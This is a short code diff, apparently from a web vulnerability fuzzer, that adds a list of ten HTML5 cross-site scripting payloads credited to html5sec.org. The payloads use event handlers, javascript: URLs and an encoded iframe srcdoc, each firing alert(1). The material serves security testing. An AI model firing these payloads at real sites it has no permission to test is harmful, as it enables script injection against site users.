@@ -273,6 +273,19 @@ _htmlTemplate = '''
 </html>
 '''
 
+# http://html5sec.org
+_h5payloads = [
+    '<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>',
+    '<input onfocus=alert(1) autofocus>',
+    '<input onblur=alert(1) autofocus><input autofocus>',
+    '<body onscroll=alert(1)>' + '<br>' * 100 + '<input autofocus>',
+    '<video><source onerror="alert(1)">',
+    '<video onerror="alert(1)"><source></source></video>',
+    '<form><button formaction="javascript:alert(1)">X</button>',
+    '<math href="javascript:alert(1)">CLICKME</math>',
+    '<link rel="import" href="test.svg" />',
+    '<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />',
+]
 
 class XSS(Fuzzer):
 
